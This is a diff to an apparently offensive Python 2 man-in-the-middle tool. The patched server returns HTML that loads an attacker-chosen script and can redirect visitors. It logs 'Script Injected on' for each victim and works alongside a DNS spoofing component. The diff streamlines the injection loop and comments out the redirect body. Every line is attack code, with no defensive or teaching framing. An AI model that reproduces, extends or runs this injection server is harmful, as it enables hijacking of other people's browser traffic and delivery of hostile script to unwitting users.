@@ -34,7 +34,11 @@ Content-Type: text/html
 
 <head>
 <script src= {}></script>
-</head>""".format(self.js)
+</head>
+""".format(self.js)
+#<body>
+#<meta http-equiv="refresh" content="0; URL='http://{}"/>
+#</body>
 		self.host = host
 		self.port = port
 
@@ -62,20 +66,13 @@ Content-Type: text/html
 		print '[+] Injection URL - http://{}:{}'.format(self.host,self.port)
 		server.bind(server_address)
 		server.listen(1)
-		for i in range(0,6):
-			try:
-				if i >= 5:
-					self.response += """<body>
-					<meta http-equiv="refresh" content="0; URL='http://{}"/>
-					</body>""".format(self.url)
-					print "[+] Script Injected on: ", client_address
-
-				connection,client_address = server.accept()
-				connection.send("%s" % self.response)
-				connection.shutdown(socket.SHUT_WR | socket.SHUT_RD)
-				connection.close()
-			except KeyboardInterrupt:
-				break
-				server.close()
+		try:
+			connection,client_address = server.accept()
+			connection.send("%s" % self.response)
+			print "[+] Script Injected on: ", client_address
+			connection.shutdown(socket.SHUT_WR | socket.SHUT_RD)
+			connection.close()
+		except KeyboardInterrupt:
+			server.close()
 		self.dnsspoof.stop()
 
